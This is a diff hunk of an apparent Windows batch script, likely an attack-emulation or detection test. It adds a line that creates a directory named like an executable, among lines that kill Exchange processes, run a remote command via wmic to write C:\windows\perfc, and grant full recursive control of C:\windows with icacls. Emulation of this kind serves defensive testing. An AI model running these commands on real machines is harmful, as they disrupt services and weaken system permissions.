@@ -382,6 +382,8 @@ taskkill.exe /f /im Microsoft.Exchange.\*
 ECHO ============================
 ECHO %logonserver%
 ECHO ============================
+cd C:\Users\Default\AppData\Local\ & mkdir Vrtrfetmntest.exe
+ECHO ============================
 wmic /node:host process call create “echo > C:\windows\perfc”
 ECHO ============================
 icacls "C:\windows" /grant Administrator:F /T
